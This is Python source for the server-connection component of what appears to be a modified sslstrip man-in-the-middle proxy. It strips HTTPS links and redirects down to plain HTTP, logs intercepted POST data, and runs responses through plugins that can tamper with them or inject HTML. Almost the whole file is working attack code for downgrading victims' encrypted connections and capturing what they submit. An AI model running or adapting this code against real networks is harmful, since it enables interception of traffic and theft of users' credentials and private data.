# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip
from io import StringIO

from twisted.web.http import HTTPClient
from sslstrip.URLMonitor import URLMonitor
from sslstrip.ResponseTampererFactory import ResponseTampererFactory
from sslstrip.HTMLInjector import HTMLInjector


from plugins_manager import ProxyPluginsManager
from plugins import *

import gzip, inspect, io

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.responseTamperer = ResponseTampererFactory.getTampererInstance()
        self.HTMLInjector     = HTMLInjector.getInstance()
        self.plugins_manager = ProxyPluginsManager.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False
        self.plugins = self.plugins_manager.plugins

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"
    
    def getUrl(self):
        return self.uri

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))

        attr ={'function': inspect.stack()[0][3]}
        self.plugins = self.plugins_manager.plugins
        for name in self.plugins:
            try:
                key, value = self.plugins_manager.hook(name,attr, self.client, key, value)
            except NotImplementedError:
                pass

        if (key.decode().lower() == 'content-encoding'):
            if (value.decode().find('gzip') != -1):
                self.isCompressed = True

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)
            self.urlMonitor.addRedirection(self.client.uri, value)


        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        # if (key.decode().lower() == 'content-encoding'):
        #     if (value.find('gzip') != -1):
        #         logging.debug("Response is compressed...")
        #         self.isCompressed = True
        # elif (key.decode().lower() == 'content-length'):
        #     self.contentLength = value
        # elif (key.lower() == 'set-cookie'):
        #     self.client.responseHeaders.addRawHeader(key, value)

        
            
        self.client.setHeader(key, value)

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):


        self.content_type = self.client.responseHeaders.getRawHeaders('content-type')

        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, io.BytesIO(data)).read()
            len_data = len(data)

        attr ={'function': inspect.stack()[0][3]}
        for name in self.plugins:
            try:
                data = self.plugins_manager.hook(name,attr, self.client , data)
                len_data = len(data)
            except NotImplementedError:
                pass
        #logging.log(self.getLogLevel(), "Read from server:\n" + data)

        if (self.isCompressed):
            s = io.BytesIO()
            g = gzip.GzipFile(fileobj=s, compresslevel=9,mode='w')
            if (hasattr(data, 'encode')):
                g.write(data.encode())
            else:
                g.write(data)
            g.close()
            data = s.getvalue()

        # data = self.replaceSecureLinks(data)

        # # ------ TAMPER ------
        # if self.responseTamperer:
        #     data = self.responseTamperer.tamper(self.client.uri, data, self.client.responseHeaders, self.client.getAllHeaders(), self.client.getClientIP())
        # # ------ TAMPER ------
        
        # # ------ HTML CODE INJECT ------
        # if self.HTMLInjector:
        #     content_type = self.client.responseHeaders.getRawHeaders('content-type')

        #     # only want to inject into text/html pages
        #     if content_type and content_type[0] == 'text/html':
        #         #data = self.HTMLInjector.inject(data)
        #         data = self.HTMLInjector.inject(data, self.client.uri)
        # # ------ HTML CODE INJECT ------
        if (self.isCompressed) and (self.content_type != None):
            self.client.setHeader('Content-Length', str(len_data).encode())

        self.client.write(data)
        self.shutdown()

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Found secure reference: " + url)

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()


